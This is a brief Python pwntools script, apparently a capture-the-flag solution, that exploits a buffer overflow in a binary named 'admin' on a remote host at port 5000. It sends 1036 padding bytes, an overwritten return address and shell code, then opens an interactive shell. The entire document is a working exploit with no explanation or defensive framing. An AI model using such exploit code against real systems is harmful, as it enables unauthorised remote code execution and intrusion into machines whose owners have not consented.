from pwn import *

context.binary = ELF("./admin")

host, port = "103.191.63.187", 5000
p = remote(host, port)

payload = b"A" * 1036 + p32(0x08049196)
payload += asm(shellcraft.sh())

p.sendline(payload)

p.interactive()
